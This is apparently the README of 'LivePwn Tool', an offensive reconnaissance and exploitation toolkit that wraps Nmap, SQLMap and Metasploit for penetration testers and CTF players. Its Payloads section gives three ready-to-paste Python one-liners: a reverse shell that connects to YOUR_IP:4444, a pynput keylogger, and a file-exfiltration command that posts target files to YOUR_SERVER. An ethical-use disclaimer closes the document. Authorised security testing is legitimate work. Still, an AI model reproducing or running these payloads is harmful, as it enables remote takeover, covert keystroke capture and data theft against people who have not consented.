# LivePwn Tool

![alt](https://i.pinimg.com/736x/e0/2c/8c/e02c8c0f5ca11f02eb11e3008a23ac88.jpg)


**LivePwn Tool** is a powerful, all-in-one reconnaissance and exploitation tool designed for **bug hunters**, **penetration testers**, and **ethical hackers**, and **CTF Players**.

---

## Features

### 1. Reconnaissance Tools
- **WHOIS Lookup**: Retrieve domain registration details.
- **Subdomain Discovery**: Find subdomains using tools like `Sublist3r` and `Amass`.
- **DNS Enumeration**: Gather DNS records (A, MX, NS, etc.).
- **Directory Brute-Forcing**: Discover hidden directories using `Dirb`, `Gobuster`, and `Dirsearch`.
- **Port Scanning**: Identify open ports and services using `Nmap`.

### 2. Exploitation Tools
- **SQL Injection**: Automate SQL injection attacks using `SQLMap`.
- **Metasploit Integration**: Launch Metasploit modules directly from the tool.

### 3. Payloads
- **Reverse Shell**: Gain remote access to a target system.
- **Keylogger**: Capture keystrokes on the target system.
- **File Exfiltration**: Send files from the target system to your server.
- **SQL Injection Payload**: Test for SQL injection vulnerabilities.
- **XSS Payload**: Test for Cross-Site Scripting (XSS) vulnerabilities.
- **Remote Code Execution (RCE)**: Execute commands on the target system.
- **Local File Inclusion (LFI)**: Exploit LFI vulnerabilities.

### 4. Reporting
- Generate detailed reports in `.txt` format for your findings.

### 5. Gamification
- Earn points and badges for discoveries.
- Compete on a global leaderboard (future feature).

## Installation

### Prerequisites
- Python 3.x
- Required Python libraries:
  ```bash
  pip install requests beautifulsoup4 pynput
  ```
## Installation Steps
### Clone the repository:
```
git clone https://github.com/livepwn/livepwns.git

cd livepwns
```
## Install dependencies:

```bash
chmod +x setup.sh
./setup.sh
```
## Run the tool:

```bash
python livepwns.py
```
## Usage
### Interactive Mode
- Launch the tool:

```bash
python livepwns.py
```
- Use the interactive menu to select tools, exploits, or payloads.

## Command-Line Mode
- Run a specific tool directly:

```bash
python livepwns.py --tool <tool_name> --target <target>
```

- Example:

```bash
python livepwns.py --tool nmap --target example.com
```

## Payloads
### Available Payloads
#### Reverse Shell:

- Replace (YOUR_IP) and (4444) with your IP and port.

- Example:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

#### Keylogger:

- Logs keystrokes to keylog.txt.

- Example:

```bash
python3 -c 'from pynput.keyboard import Listener; import logging; logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s"); def on_press(key): logging.info(str(key)); with Listener(on_press=on_press) as listener: listener.join()'
```

#### File Exfiltration:

- Replace YOUR_SERVER with your server URL.

- Example:

```bash
python3 -c 'import requests; url="http://YOUR_SERVER/upload"; files={"file": open("/path/to/target/file.txt", "rb")}; requests.post(url, files=files)'
```
## Examples
### Reconnaissance
- Perform a WHOIS lookup:

```bash
python livepwns.py --tool whois --target example.com
```
### Discover subdomains:

```bash
python livepwns.py --tool subdomain --target example.com
```


## Exploitation
- Run an SQL injection attack:

```bash
python livepwns.py --tool sqlmap --target http://example.com/vulnerable_page
```
## Payloads
- Generate a reverse shell payload:

```bash
python livepwns.py
```
- Navigate to the Payloads Menu and select Reverse Shell.


## Reporting
- Generate a report of your findings:

```bash
python livepwns.py
```
- Navigate to the Generate Report option and provide a report name.

## Ethical Use
###  Authorization: 
Only use this tool on systems you own or have explicit permission to test.

### Legal Compliance: 
Ensure you comply with all applicable laws and regulations.

### Responsibility: 
Use this tool responsibly and ethically.

## Author
LivePwn

- Github [@livepwn](https://www.github.com/1pwn)

## License
This project is licensed under the MIT License. See the LICENSE file for details.

## Contributing
Contributions are welcome! Please open an issue or submit a pull request.

## Support
For support, questions, or feedback, please open an issue on the GitHub repository.

## Disclaimer
This tool is for educational purposes only. The author is not responsible for any misuse or damage caused by this tool.




  